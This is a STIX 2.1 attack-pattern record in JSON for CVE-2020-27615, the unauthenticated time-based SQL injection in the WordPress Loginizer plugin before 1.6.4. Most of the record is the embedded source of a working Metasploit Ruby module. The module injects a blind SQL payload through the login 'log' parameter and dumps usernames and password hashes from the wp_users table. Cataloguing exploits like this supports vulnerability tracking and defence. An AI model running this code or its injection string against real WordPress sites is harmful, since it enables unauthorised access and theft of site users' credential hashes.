{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--08042104-01c9-4a9f-9fe0-ba3f0ed71fe1",
    "created": "2024-08-14T16:28:40.468234Z",
    "modified": "2024-08-14T16:28:40.468238Z",
    "name": "WordPress Loginizer log SQLi Scanner",
    "description": " Loginizer wordpress plugin contains an unauthenticated timebased SQL injection in versions before 1.6.4.  The vulnerable parameter is in the log parameter. Wordpress has forced updates of the plugin to all servers ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/wp_loginizer_log_sqli.rb",
            "external_id": "wp_loginizer_log_sqli.rb"
        },
        {
            "source_name": "reference",
            "url": "https://wpdeeply.com/loginizer-before-1-6-4-sqli-injection/"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-27615"
        },
        {
            "source_name": "reference",
            "url": "https://loginizer.com/blog/loginizer-1-6-4-security-fix/"
        },
        {
            "source_name": "reference",
            "url": "https://twitter.com/mslavco/status/1318877097184604161"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::SQLi\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'WordPress Loginizer log SQLi Scanner',\n        'Description' => %q{\n          Loginizer wordpress plugin contains an unauthenticated timebased SQL injection in\n          versions before 1.6.4.  The vulnerable parameter is in the log parameter.\n          Wordpress has forced updates of the plugin to all servers\n        },\n        'Author' => [\n          'h00die', # msf module\n          'red0xff', # sqli help\n          'mslavco' # discovery\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['URL', 'https://wpdeeply.com/loginizer-before-1-6-4-sqli-injection/'],\n          ['CVE', '2020-27615'],\n          ['URL', 'https://loginizer.com/blog/loginizer-1-6-4-security-fix/'],\n          ['URL', 'https://twitter.com/mslavco/status/1318877097184604161']\n        ],\n        'Actions' => [\n          ['List Users', { 'Description' => 'Queries username, password hash for COUNT users' }],\n        ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS]\n        },\n        'DefaultAction' => 'List Users',\n        'DisclosureDate' => '2020-10-21'\n      )\n    )\n    register_options [\n      OptInt.new('COUNT', [false, 'Number of users to enumerate', 1])\n    ]\n  end\n\n  def run_host(ip)\n    unless wordpress_and_online?\n      vprint_error('Server not online or not detected as wordpress')\n      return\n    end\n\n    wp_ver = wordpress_version\n    if wp_ver.nil?\n      vprint_error('Unable to determine wordpress version, check settings.')\n      return\n    end\n\n    if Rex::Version.new(wp_ver) < Rex::Version.new('5.4')\n      vprint_error(\"Wordpress (core) #{wp_ver} is unexploitable.  Version 5.4+ required.\")\n      return\n    end\n\n    checkcode = check_plugin_version_from_readme('loginizer', '1.6.4')\n    if checkcode == Msf::Exploit::CheckCode::Safe\n      vprint_error('Loginizer version not vulnerable')\n      return\n    else\n      print_good('Vulnerable version of Loginizer detected')\n    end\n\n    cookie = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'wp-login.php')\n    })\n    if cookie.nil?\n      print_error('Unable to retrieve wordpress cookie, check settings.')\n      return\n    end\n    cookie = cookie.get_cookies\n    password = Rex::Text.rand_text_alpha(10)\n\n    @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind) do |payload|\n      if payload.include?('<')\n        payload.gsub!(/<>/, '=')\n        payload.gsub!(/(sleep\\(\\d+\\.?\\d*\\)),0/) { \"0,#{Regexp.last_match(1)}\" }\n      end\n      res = send_request_cgi({\n        'method' => 'POST',\n        'uri' => normalize_uri(target_uri.path, 'wp-login.php'),\n        'cookie' => cookie,\n        'vars_post' => {\n          'log' => \"',ip=LEFT(UUID(),8),url=#{payload}#\",\n          'pwd' => password,\n          'wp-submit' => 'Login',\n          'redirect_to' => '',\n          'testcookie' => '1'\n        }\n      })\n      fail_with Failure::Unreachable, 'Connection failed' unless res\n    end\n    unless @sqli.test_vulnerable\n      print_bad(\"#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.\")\n      return\n    end\n\n    columns = ['user_login', 'user_pass']\n    results = @sqli.dump_table_fields('wp_users', columns, '', datastore['COUNT'])\n    table = Rex::Text::Table.new('Header' => 'wp_users', 'Indent' => 1, 'Columns' => columns)\n    results.each do |user|\n      create_credential({\n        workspace_id: myworkspace_id,\n        origin_type: :service,\n        module_fullname: fullname,\n        username: user[0],\n        private_type: :nonreplayable_hash,\n        jtr_format: Metasploit::Framework::Hashes.identify_hash(user[1]),\n        private_data: user[1],\n        service_name: 'Wordpress',\n        address: ip,\n        port: datastore['RPORT'],\n        protocol: 'tcp',\n        status: Metasploit::Model::Login::Status::UNTRIED\n      })\n      table << user\n    end\n    print_good(table.to_s)\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-10-21"
}